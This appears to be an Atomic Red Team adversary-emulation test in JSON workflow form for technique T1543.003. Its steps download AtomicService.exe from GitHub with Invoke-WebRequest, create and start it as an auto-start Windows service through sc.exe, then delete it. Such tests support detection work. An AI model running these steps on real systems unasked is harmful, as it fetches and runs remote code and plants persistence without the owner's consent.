{
  "id": "981e2942-e433-44e9-afc1-8c957a1496b6",
  "name": "Service Installation CMD",
  "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "68e38404-eb34-45bf-85e2-e8149103c823",
      "type": "execute-command",
      "data": {
        "command": "sc.exe create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type}  type=#{service_type}\nsc.exe start #{service_name}\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "865415d8-72c2-4d38-aa6b-913dad4df353",
      "type": "execute-command",
      "data": {
        "command": "sc.exe stop #{service_name} \u003enul 2\u003e\u00261\nsc.exe delete #{service_name} \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "3c2186d1-70f5-4b29-82b0-8eca17dde0fa",
      "name": "Check dependency 1/1",
      "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9ddbcccf-9a55-4061-8b28-c220b8e23335",
      "name": "Resolve dependency 1/1",
      "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1a85781b-2c3e-417f-91ff-c779776f392c",
      "name": "Re-check dependency 1/1",
      "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "68e38404-eb34-45bf-85e2-e8149103c823",
      "p": "on-success",
      "o": "865415d8-72c2-4d38-aa6b-913dad4df353"
    },
    {
      "s": "68e38404-eb34-45bf-85e2-e8149103c823",
      "p": "on-failure",
      "o": "865415d8-72c2-4d38-aa6b-913dad4df353"
    },
    {
      "s": "3c2186d1-70f5-4b29-82b0-8eca17dde0fa",
      "p": "on-success",
      "o": "68e38404-eb34-45bf-85e2-e8149103c823"
    },
    {
      "s": "3c2186d1-70f5-4b29-82b0-8eca17dde0fa",
      "p": "on-failure",
      "o": "9ddbcccf-9a55-4061-8b28-c220b8e23335"
    },
    {
      "s": "9ddbcccf-9a55-4061-8b28-c220b8e23335",
      "p": "on-success",
      "o": "1a85781b-2c3e-417f-91ff-c779776f392c"
    },
    {
      "s": "1a85781b-2c3e-417f-91ff-c779776f392c",
      "p": "on-failure",
      "o": "68e38404-eb34-45bf-85e2-e8149103c823"
    }
  ],
  "tags": [
    "T1543.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "binary_path",
      "type": "path",
      "description": "Name of the service binary, include path.",
      "value": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"
    },
    {
      "name": "service_type",
      "type": "string",
      "description": "Type of service. May be own|share|interact|kernel|filesys|rec|userown|usershare",
      "value": "Own"
    },
    {
      "name": "startup_type",
      "type": "string",
      "description": "Service start method. May be boot|system|auto|demand|disabled|delayed-auto",
      "value": "auto"
    },
    {
      "name": "service_name",
      "type": "string",
      "description": "Name of the Service",
      "value": "AtomicTestService_CMD"
    }
  ]
}